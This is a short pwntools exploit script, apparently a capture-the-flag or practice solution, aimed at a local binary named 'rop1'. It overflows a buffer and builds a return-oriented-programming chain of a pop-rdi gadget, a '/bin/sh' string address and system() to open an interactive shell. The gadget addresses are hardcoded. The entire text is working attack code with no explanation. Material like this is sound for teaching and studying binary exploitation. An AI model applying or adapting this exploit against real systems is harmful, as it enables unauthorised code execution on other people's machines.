
from pwn import *

context.terminal = ['tmux','splitw','-h']
POP_RDI = 0x0000000000400713
ROP_RSI_R15 = 0x0000000000400563
SYSTEM = 0x7ffff7a3cdc0
BINSH = 0x7ffff7b98f20

p = process('./rop1')

script = """
b main
"""
#gdb.attach(p,script)

payload = "A"*128 + "N"*8

payload+= p64(POP_RDI) + p64(BINSH)
payload+= p64(SYSTEM)


p.send(payload)

p.interactive()

